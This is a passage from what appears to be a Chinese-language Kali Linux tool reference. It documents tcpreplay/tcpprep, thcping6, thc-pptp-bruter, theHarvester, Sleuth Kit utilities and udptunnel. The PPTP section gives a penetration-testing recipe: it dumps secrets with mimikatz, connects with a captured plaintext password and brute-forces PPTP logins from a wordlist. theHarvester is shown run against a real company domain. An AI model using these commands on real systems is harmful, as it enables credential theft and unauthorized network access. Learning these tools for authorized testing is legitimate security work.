–v</span><br><br>制作cache文件，在cache文件中写入“100M BT Packet”的注释。<br><br>c、 使用tcpreplay重放报文。<br><br>[root@A ~]<span class="hljs-comment"># tcpreplay -c bt.cache -i eth0 -j eth1 bt.pcap -v –R</span><br><br>3、 重放tftp服务器上抓到的报文<br><br>a、 在tftp服务器上使用ethereal抓包，存为tftp.pcap文件。<br><br>b、 将pcap文件进行tcpprep的操作，制作cache文件。<br><br>[root@A ~]<span class="hljs-comment"># tcpprep -an server -i tftp.pcap -o tftp.cache –v</span><br><br>注意：我在测试的时候犯了一个错误，使用DUT的tftp升级来做实验，同时穿过DUT重放报文，结果在网卡发送报文的后，DUT的mac地址做了的回应，导致交互过程没有穿过DUT，这个问题比较搞笑，上午弄了半天才发现原因，开始还以为udp的连接不能重放。<br><br>c、 使用tcpreplay重放报文。<br><br>[root@A ~]<span class="hljs-comment"># tcpreplay -c tftp.cache -i eth0 -j eth1 tftp.pcap –v</span><br>Tcpprep和Tcprepaly的原理<br><br>对于原理部分，目前还没有看过代码，王海斌同学打算先看过源码后，再在windows上调试一个tcpreplay的程序供测试使用。具体的实现原理日后补充。<br><br> <br><br>tcpprep是一个在tcpreplay和tcprewrite（3.0.beta11版本才有，这里不讨论）之前使用的pcap文件的处理程序。使用tcpprep的目的就是建立一个cache文件，用于分离通信流量中的两方（通常叫做 主要的/次要的 或者 客户端/服务器）。如果你正打算在两块网卡上使用tcpreplay的话，那么tcpprep就是用来决定每一个报文（packet）从哪一个接口发出。通过使用这样一个分离的程序来建立一个cache文件，tcpreplay就可以根据这个cache文件通过自身的计算来分离流量，高速率的发送报文。<br><br>目前王海斌看过代码后，对cache文件的作用解释，主要是加速报文的发送，cache文件中存放着pcap文件中每个帧的编号和时间戳等信息，以达到tcpreplay回放时可以更加快速的发送报文的目的。<br><br>其实我们要使用tcpreplay的功能的话，肯定就是它的重放功能，而重放的话肯定是一个客户端和服务器的交互过程，例如ftp、tftp、sqlnet、rtsp、mms等应用层协议的交互过程，我们只要有正确和足够的pcap文件，只需要制作cache文件，使用tcpreplay的命令，就不需要每次都搭建一个真实的测试环境来测试DUT对该协议的支持程度。所以在介绍tcpreplay之前先介绍tcpprep这个命令的使用。tcprewrite提供的功能暂时不做研究。<br><br>Tcpprep帮助文件说明<br><br>    由于时间问题，这次不能对man文件一一做解释，这个说明文档主要是对-h打印出来的命令参数作一个说明，结合几个实际的例子来说明tcpprep的使用。强烈建议大家去官方网站去阅读他们提供的文档，http://tcpreplay.synfin.net/trac/，我这里有打印的内容，有兴趣的可以拿去看一下。<br><br>    Usage: tcpprep [-a -n &lt;mode&gt; -N &lt;<span class="hljs-built_in">type</span>&gt; | -c &lt;cidr&gt; | -p | -r &lt;regex&gt;]<br><br>                -o &lt;out&gt; -i &lt;<span class="hljs-keyword">in</span>&gt; &lt;args&gt;<br><br> <br><br>                 -a &lt;st1:city w:st=<span class="hljs-string">&quot;on&quot;</span>&gt;&lt;st1:place w:st=<span class="hljs-string">&quot;on&quot;</span>&gt;Split&lt;/st1:place&gt;&lt;/st1:city&gt; traffic <span class="hljs-keyword">in</span> Auto Mode&lt;o:p&gt;&lt;/o:p&gt;<br><br>一般情况下都需要该参数，表示按模式自动分离的通讯流量生成cache文件，这个参数一半都和-n参数一起使用，表示自动分离采取的拓扑模式，来决定采取那种模式分离通讯流量的双方。<br><br>-c CIDR1,CIDR2,…      Split traffic <span class="hljs-keyword">in</span> CIDR Mode<br><br>可选参数，表示分离流量时采用CIDR（无类别域间路由选择）模式。格式：tcpprep  -ac &lt;st1:chsdate w:st=<span class="hljs-string">&quot;on&quot;</span> isrocdate=<span class="hljs-string">&quot;False&quot;</span> islunardate=<span class="hljs-string">&quot;False&quot;</span> day=<span class="hljs-string">&quot;30&quot;</span> month=<span class="hljs-string">&quot;12&quot;</span> year=<span class="hljs-string">&quot;1899&quot;</span>&gt;10.10.0&lt;/st1:chsdate&gt;.0/24，表示把源地址匹配10.10.0.0/24网段的报文全部由主网卡发送，剩下的报文由从网卡发送出来，这里还有一点需要补充，就是tcpreplay在重放报文时对两个网卡的定义很明确，一个主网卡（primary interface），一个是从网卡（secondary interface），不同的模式，两块网卡的属性不一样。该参数不能和-r,-a一起使用。&lt;o:p&gt;&lt;/o:p&gt;<br><br>-C &lt;comment&gt;            Embed comment <span class="hljs-keyword">in</span> tcpprep cache file<br><br>可选参数，表示在cache文件中嵌入注释内容，可以用于注释说明cache文件的内容，注意使用时参数位置，不要放在最后，我测试时放在-o参数值的后面就报错，放到-i参数之前就可以。生成cache文件后使用-P可以查看写入的内容。<br><br>-h                      Help<br><br>显示帮助文件。<br><br>-i &lt;capfile&gt;            Input capture file to process<br><br>生成cache文件的必带参数，后面紧跟pcap文件名，表示这个pcap文件需要处理。<br><br>-m &lt;minmask&gt;            Minimum mask length <span class="hljs-keyword">in</span> Auto/Router mode<br><br>可选参数，在选用router模式时使用，表示最小掩码，默认是30（2个有效ip地址）。<br><br>-M &lt;maxmask&gt;            Maximum mask length <span class="hljs-keyword">in</span> Auto/Router mode<br><br>可选参数，在选用router模式时使用，表示最大掩码，默认是8（1600万个ip地址）。<br><br>-n &lt;auto mode&gt;          Use specified algorithm <span class="hljs-keyword">in</span> Auto Mode<br><br>生成cache文件的必带参数，后面紧跟模式名称，可选项有(bridge|router|client|server)，目前&lt;st1:chsdate w:st=<span class="hljs-string">&quot;on&quot;</span> isrocdate=<span class="hljs-string">&quot;False&quot;</span> islunardate=<span class="hljs-string">&quot;False&quot;</span> day=<span class="hljs-string">&quot;30&quot;</span> month=<span class="hljs-string">&quot;12&quot;</span> year=<span class="hljs-string">&quot;1899&quot;</span>&gt;2.3.5&lt;/st1:chsdate&gt;版本只支持这4种模式。模式的选择很关键，例如在客户端使用ftp软件下载文件，那么你在客户端抓到的报文生成的pcap文件，那么就选用client模式，在服务器端抓到的报文生成的pcap文件就选用server模式。只有模式选对了，才能正确的分离流量从正确的接口发出正确的报文。注意：Server端的报文由主网卡发送出去，Client端的报文由从网卡发送出去。怎么确定主从网卡由tcpreplay的命令（-i –j两个参数）来决定。<br><br>-N client|server        Classify non-IP traffic as client/server<br><br>可选参数，表示非IP的流量（例如ARP报文）从哪个接口送出，因为很多的tcpprcp支持的模式中，都依赖于IP头部中的IP地址信息来决定报文是从client端还是从server端发送出去。但是并不是所有的报文都是IPv4结构的，所以这种情况下，tcpprep不能确定这些非IPv4类型的报文应该从哪个接口发送出去，所以，默认的配置就是从client的接口发送出去。如果你硬要正确的分离出非IPv4报文的话，可以使用MAC address模式（–mac）。3.0版本才支持。<br><br>-o &lt;outputfile&gt;         Output cache file name<br><br>生成cache文件的必带参数，后面紧跟cache文件名，表示这个输出的cache文件以这个名字命名。<br><br>-p                     &lt;st1:place w:st=<span class="hljs-string">&quot;on&quot;</span>&gt;&lt;st1:city w:st=<span class="hljs-string">&quot;on&quot;</span>&gt;Split&lt;/st1:city&gt;&lt;/st1:place&gt; traffic based on destination port<br><br>    可选参数，基于目的端口来分离通讯流量，它区分的依据是认为0-1023端口都是服务器的端发出的报文，其它的端口都是客户端发出的报文，具体的端口对应的/etc/services文件里的的内容。使用的格式：-p /etc/services，可以根据自己的需要来制作一个文件也可以。<br><br>-P &lt;file&gt;               Print comment <span class="hljs-keyword">in</span> tcpprep file<br><br>    可选参数，查看cache文件的内容。<br><br>-r &lt;regex&gt;             &lt;st1:place w:st=<span class="hljs-string">&quot;on&quot;</span>&gt;&lt;st1:city w:st=<span class="hljs-string">&quot;on&quot;</span>&gt;Split&lt;/st1:city&gt;&lt;/st1:place&gt; traffic <span class="hljs-keyword">in</span> Regex Mode<br><br>    可选参数，表示使用Regex模式分离通讯流量，有点类似于CIDR模式，但是它匹配的是服务器的源IP。man文件提示不能和-a、-c参数一起使用，但是我使用了也没有报错，格式：-r <span class="hljs-string">&quot;(192)&quot;</span>或-r <span class="hljs-string">&quot;(192|172)\…..*&quot;</span>，具体应用还有待实验。<br><br>-R &lt;ratio&gt;              Specify a ratio to use <span class="hljs-keyword">in</span> Auto Mode<br><br>    可选参数，一个比例值，这个比例值的意义是服务器端发起的连接数和客户端发起的连接数的比例，这个值大于2的话就视为server端。这个英文原意我也不是太肯定，大家可以参考一下原文：<br><br>The ratio of server connections to client connections  necessary to  be classified as a server <span class="hljs-keyword">in</span> auto mode.  A system is classified as a server <span class="hljs-keyword">if</span> [<span class="hljs-comment"># server connections] &gt;= ([# client connections] * [ratio]).  Default is: 2.0</span><br><br>-s &lt;file&gt;               Specify service ports <span class="hljs-keyword">in</span> /etc/services format<br><br>    可选参数，在man文件中没有对该参数的解释，估计就是按/etc/services文件里的格式来定义服务的端口，没有太多的研究意义。<br><br>-x &lt;match&gt;              Only send the packets specified<br><br>    重要的可选参数，表示按照参数定义的需求来定义发送报文。后面还有具体的参数，因为在我们的抓包过程中，可能会由于网络环境原因，抓到了许多我们不需要回放的报文，我们就可以根据这个参数决定我们需要回放哪些报文内容。具体的参数意思如下：<br><br>    S:&lt;CIDR1&gt;,… – Src IP must match specified CIDR(s)<br><br>    在CIDR模式下必须匹配源IP，格式：-xS:100.1.1.0/24,&lt;st1:chsdate w:st=<span class="hljs-string">&quot;on&quot;</span> year=<span class="hljs-string">&quot;1899&quot;</span> month=<span class="hljs-string">&quot;12&quot;</span> day=<span class="hljs-string">&quot;30&quot;</span> islunardate=<span class="hljs-string">&quot;False&quot;</span> isrocdate=<span class="hljs-string">&quot;False&quot;</span>&gt;10.10.10&lt;/st1:chsdate&gt;.0/26。多个用逗号隔开，参数个数没有试过，3个没有问题。<br><br>D:&lt;CIDR1&gt;,… – Dst IP must match specified CIDR(s)<br><br>在CIDR模式下必须匹配目的IP，格式同上。<br><br>B:&lt;CIDR1&gt;,… – Both src and dst addresses must match<br><br>必须同时匹配源和目的IP，格式同上。<br><br>E:&lt;CIDR1&gt;,… – Either src or dst address must match<br><br>匹配源或目的IP，格式同上。<br><br></code></pre></td></tr></table></figure><p>实例:<a href="https://www.baidu.com/link?url=Qd6QQwC7AIECpwADCeqjesBqG0qpZT2gbxYU0hxFGCs5CkEkY-Dnh0Ac0MmoFNVP7vzmT_ySIIgOJbsUHJS87S-otewZKiSMlcI6IHfN2R3&wd=&eqid=fc2e9919001423d200000005625a721a">https://www.baidu.com/link?url=Qd6QQwC7AIECpwADCeqjesBqG0qpZT2gbxYU0hxFGCs5CkEkY-Dnh0Ac0MmoFNVP7vzmT_ySIIgOJbsUHJS87S-otewZKiSMlcI6IHfN2R3&amp;wd=&amp;eqid=fc2e9919001423d200000005625a721a</a></p><h2 id="thcping6"><a href="#thcping6" class="headerlink" title="thcping6"></a>thcping6</h2><h3 id="描述：-90"><a href="#描述：-90" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161543347.png" alt="image-20220416154338151"></p><h3 id="参数：-73"><a href="#参数：-73" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">address6 &lt;mac-address/ipv4-address/ipv6-address&gt; [ipv6-prefix]<br>将mac或ipv4地址转换为ipv6地址（如果未将前缀作为第二选项提供链接，则为本地链接），或者在给定ipv6地址的情况下，打印mac或ipv4地址。 打印所有可能的变体。 对于错误或找到的变体数返回-1。<br><br>alive6 &lt;interface&gt; [unicast-or-multicast-address [remote-router]]<br>在细分中显示有效地址。 如果指定了远程路由器，则将发送带有分片前缀的路由头的数据包。<br><br>covert_send6 &lt;interface&gt; &lt;target&gt; &lt;file&gt; [port]<br>秘密地将FILE的内容发送到目标。<br><br>covert_send6d &lt;interface&gt; &lt;file&gt;<br>将收到的秘密内容写入FILE。<br><br>denial6 &lt;interface&gt; &lt;destination&gt; &lt;test-case-number&gt;<br>对目标执行各种拒绝服务攻击。<br><br>detect_sniffer6 &lt;interface&gt; [target-ip]<br>测试本地LAN上的系统是否正在嗅探。 适用于Windows，Li<br></code></pre></td></tr></table></figure><h2 id="thc-pptp-bruter"><a href="#thc-pptp-bruter" class="headerlink" title="thc-pptp-bruter"></a>thc-pptp-bruter</h2><h3 id="描述：-91"><a href="#描述：-91" class="headerlink" title="描述："></a>描述：</h3><p>PPTP(即点对点隧道协议)可以使远程用户通过拨入ISP访问企业内网。</p><p>　　在渗透测试中，如果获得了用户的PPTP口令，就能远程拨入内网，做进一步渗透。</p><p>顾名思义，THC-PPTP-Bruter是针对PPTP VPN端点（TCP 端口1723）的暴力破解程序。支持最新的MSChapV2验证，对windows和cisco网关测试通过，用以探测微软的Anti-Brute Force Implementation中存在的一个漏洞，并通过此漏洞，尝试以每秒300个密码进行暴力破解。</p><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p><strong>0x02 Windows系统命令行下PPTP配置信息和口令的获取</strong></p><p>　　<strong>1、获取PPTP配置信息</strong></p><p>　　Windows系统拨号和宽带连接的配置信息存储在固定位置，路径如下：</p><p>　%APPDATA%\Microsoft\Network\Connections\Pbk\rasphone.pbk</p><p>　　查看该文件即可获得PPTP连接的配置信息，包括服务器IP，不包含连接用户名和口令</p><p>　　VPN连接的名称为VPN Connection，如下图：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038765.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　PhoneNumber表示连接的服务器IP，如下图：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038061.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　<strong>2、获得内网IP</strong></p><p>　　ipconfig</p><p>　　获得内网IP，如下图<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038994.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　<strong>3、获得PPTP口令</strong></p><p>　　使用工具mimiaktz，命令如下：</p><p>　　mimikatz.exe privilege::debug token::elevate lsadump::secrets exit</p><p>　　获得连接用户名和口令，如下图：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038022.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　<strong>4、命令行下连接VPN</strong></p><p>　　rasdial “VPN Connection” zhaodg oZ7iFk25</p><p>　　如下图：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038267.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　<strong>5、命令行关闭VPN连接</strong></p><p>　　rasphone -h “VPN Connection”</p><p>　　<strong>0x03 Windows系统PPTP连接的方法和细节</strong></p><p>　　1.如下图所示：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038798.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　2.如下图所示：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038547.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　3.如下图所示：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038607.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　4.选择创建新连接</p><p>　　5.填入服务器IP，选中稍后连接</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038517.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　6.填入用户名口令</p><p>　　7.点击连接后，选择跳过</p><p>　　接下来修改VPN属性，Security-&gt;Type of VPN,选择Point to Point Tunneling Protocol(PPTP)</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038849.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　注：创建成功后，指定Point to Point Tunneling Protocol(PPTP)可缩短连接等待的时间</p><p>　　8.连接</p><p>　　<strong>0x04 Kali系统PPTP连接的方法和细节</strong></p><p>　　<strong>方法1：通过界面</strong></p><p>　　1.安装</p><p>　　apt-get install network-manager-pptp network-manager-pptp-gnome</p><p>　　2.Settings-&gt;Network-&gt;VPN</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038878.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　3.Identity-&gt;Advanced…</p><p>　　去掉PAP,CHAP,EAP</p><p>　　选择Use Point-to-Point encryption(MPPE)</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038310.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　注：如果无法连接，修改文件&#x2F;etc&#x2F;NetworkManager&#x2F;NetworkManager.conf</p><p>　　managed&#x3D;false修改成managed&#x3D;true</p><p>　　重启系统</p><p>　　<strong>方法2：通过pptpsetup</strong></p><p>　　1.连接</p><p>　　pptpsetup –create vpn –server 5x.xxx.xxx.xx2 –username zhaodg –password oZ7iFk25 –encrypt –start</p><p>　　远程IP为192.168.0.1，如下图</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038216.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　2.修改路由表</p><p>　　将默认路由表修改为远程IP</p><p>　　route del default</p><p>　　route add default gw 192.168.0.1</p><p>　　<strong>0x05 PPTP口令爆破</strong></p><p>　　PPTP服务器默认开放1723端口</p><p>　　<strong>1、PPTP brute forcer</strong></p><p>　　源代码：</p><p>　　<a href="https://github.com/BlackArch/thc-pptp-bruter">https://github.com/BlackArch/thc-pptp-bruter</a></p><p>　　kali默认支持</p><p>　　通过字典爆破的命令如下：</p><p>　　cat wordlist | thc-pptp-bruter -u zhaodg</p><p>　　如下图</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162038218.png" alt="渗透技巧——PPTP口令的获取与爆破"></p><p>　　注：PPTP搭建于centos</p><h2 id="theharverter"><a href="#theharverter" class="headerlink" title="theharverter"></a>theharverter</h2><h3 id="描述：-92"><a href="#描述：-92" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162039595.png" alt="image-20220416203933737"></p><h3 id="参数：-74"><a href="#参数：-74" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h, --<span class="hljs-built_in">help</span><br>显示此帮助信息并退出<br><br>-d DOMAIN, --domain DOMAIN<br>要搜索的公司名称或域名。<br><br>-l LIMIT, --<span class="hljs-built_in">limit</span> LIMIT<br>限制搜索结果的数量，默认为500。<br><br>-S START, --start START<br>从结果编号X开始，默认= 0。<br><br>-g, --google-dork<br>使用Google Dorks进行Google搜索。<br><br>-p, --proxies<br>对请求使用代理，在agents .yaml中输入代理。<br><br>-s, --shodan<br>使用Shodan查询已发现的主机。<br><br>--screenshot SCREENSHOT<br>拍摄已解析域的屏幕快照以指定输出目录：--screenshot output_directory<br><br>-v, --virtual-host<br>验证主机名通过DNS解析和搜索虚拟主机。<br><br>-e DNS_SERVER, --dns-server DNS_SERVER<br>用于查找的DNS服务器。<br><br>-t DNS_TLD, --dns-tld DNS_TLD<br>执行DNS TLD扩展发现，默认为False。<br><br>-r, --take-over<br>检查接管。<br><br>-n, --dns-lookup<br>启用DNS服务器查找，默认为False。<br><br>-c, --dns-brute<br>在域上执行DNS暴力破解。<br><br>-f FILENAME, --filename FILENAME<br>将结果保存到HTML和/或XML文件。<br><br>-b SOURCE, --<span class="hljs-built_in">source</span> SOURCE<br>baidu, bing, bingapi, bufferoverun, certspotter,crtsh, dnsdumpster, duckduckgo, exalead, github-code,google, hackertarget, hunter, <br></code></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>theHarvester -d pinduoduo.com -l 400 -b baidu -f &#x2F;usr&#x2F;local&#x2F;pinduoduo.html</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162102315.png" alt="image-20220416210213149"></p><p>XML文件输出结果如下：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162104274.png" alt="在这里插入图片描述"></p><p>HTML输出结果如下：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162105794.png" alt="在这里插入图片描述"></p><h2 id="Thunar-文件管理器"><a href="#Thunar-文件管理器" class="headerlink" title="Thunar 文件管理器"></a>Thunar 文件管理器</h2><h3 id="描述：-93"><a href="#描述：-93" class="headerlink" title="描述："></a>描述：</h3><p>顾名思义</p><h3 id="参数：-75"><a href="#参数：-75" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162105453.png" alt="image-20220416210557263"></p><h2 id="tsk-comparedir"><a href="#tsk-comparedir" class="headerlink" title="tsk_comparedir"></a>tsk_comparedir</h2><h3 id="描述：-94"><a href="#描述：-94" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162108947.png" alt="image-20220416210803804"></p><h3 id="参数：-76"><a href="#参数：-76" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">-o sector_offset<br>要比较的映像或设备中的分区的扇区偏移量。<br><br>-n start_inum<br>从映像中一个目录开始比较。<br><br>-v<br>详细输出到stderr<br><br>-V<br>打印版本信息<br><br>-f fstype<br>指定文件系统类型。使用<span class="hljs-string">&#x27;-f list&#x27;</span>列出支持的文件系统类型。如果没有给出，使用自动检测方法。<br><br>-i imgtype<br>图像文件的格式，例如raw。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-b dev_sector_size<br>设备扇区的大小(以字节计)。如果没有给出，使用自动检测方法。<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾的文件），则后续的图像段将自动包含在内。<br><br></code></pre></td></tr></table></figure><h2 id="tsk-gettimes"><a href="#tsk-gettimes" class="headerlink" title="tsk_gettimes"></a>tsk_gettimes</h2><h3 id="描述：-95"><a href="#描述：-95" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162111510.png" alt="image-20220416211149364"></p><h3 id="参数：-77"><a href="#参数：-77" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">-v<br>详细输出到stderr<br><br>-V<br>打印版本信息<br><br>-f fstype<br>指定文件系统类型。 使用“ -f列表”列出支持的文件系统类型。 如果未给出，则使用自动检测方法。<br><br>-i imgtype<br>图像文件的格式，如raw。使用<span class="hljs-string">&#x27;-i list&#x27;</span>列出支持的类型。如果没有给出，使用自动检测方法。<br><br>-b dev_sector_size<br>设备扇区的大小(以字节计)。如果没有给出，使用自动检测方法。<br><br>-o sector_offset<br>如果没有给定要恢复的卷(只恢复该卷)的扇区偏移量，将尝试恢复映像中的所有卷并将它们保存到不同的文件夹。<br><br>-s seconds<br>原始系统的时间偏差（以秒为单位）。 例如，如果原始系统的速度慢了100秒，则该值为-100。<br><br>-z zone<br>原始系统时区的ASCII字符串。例如，EST或GMT。这些字符串必须由您的操作系统定义，并且可能有所不同。<br><br>image [images]<br>要读取的磁盘或分区映像，其格式用<span class="hljs-string">&#x27;-i&#x27;</span>表示。如果图像被分割成多个段，可以给出多个图像文件名。如果只给出一个图像文件，并且它的名称是序列中的第一个(例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾)，则将自动包含后续图像段。<br><br></code></pre></td></tr></table></figure><h2 id="tak-recover"><a href="#tak-recover" class="headerlink" title="tak_recover"></a>tak_recover</h2><h3 id="描述：-96"><a href="#描述：-96" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204162119795.png" alt="image-20220416211914530"></p><h3 id="参数：-78"><a href="#参数：-78" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">-v<br>详细输出到stderr<br><br>-V<br>打印版本信息<br><br>-a<br>仅恢复已分配文件<br><br>-e<br>恢复所有文件(已分配和未分配)<br><br>-f fstype<br>指定文件系统类型。 使用“ -f列表”列出支持的文件系统类型。 如果未给出，则使用自动检测方法。<br><br>-i imgtype<br>图像文件的格式，例如raw。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-b dev_sector_size<br>设备扇区的大小(以字节计)。如果没有给出，使用自动检测方法。<br><br>-o sector_offset<br>要恢复的卷的扇区偏移（仅恢复该卷）如果未指定，将尝试恢复映像中的所有卷并将它们保存到其他文件夹。<br><br>-d dir_inum<br>要从中恢复的目录inum（还必须使用-o指定特定分区，否则必须没有卷系统）<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个文件（例如，以“ .001”结尾的文件），则会自动包含后续的图像段。<br><br>output_dir<br>要在其中保存恢复文件的目录。<br><br></code></pre></td></tr></table></figure><h1 id="U"><a href="#U" class="headerlink" title="U"></a>U</h1><h2 id="udptunnel"><a href="#udptunnel" class="headerlink" title="udptunnel"></a>udptunnel</h2><h3 id="描述：-97"><a href="#描述：-97" class="headerlink" title="描述："></a>描述：</h3><p>在部分受限的网络环境中，UDP协议被受限，但TCP不受限制。Kali Linux提供一个UDP转TCP隧道工具udptunnel。该工具可以分别启动服务器端和客户端。客户端要发送和接受的UDP数据可以通过和服务器建立的TCP连接进行传输。这样，就可以绕过网络的限制。同时，该工具还提供RTP模式，用于传输RTP和RTCP的数据。</p><h3 id="参数：-79"><a href="#参数：-79" class="headerlink" title="参数："></a>参数：</h3><p>假设你的UDP已被屏蔽，假设你的服务器IP为44.55.66.77，你有一个服务在监听udp端口7777。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Runat server side:</span><br>./udp2raw_amd64-s -l0.0.0.0:4096 -r 127.0.0.1:7777  -a-k <span class="hljs-string">&quot;passwd&quot;</span> --raw-mode faketcp <br><span 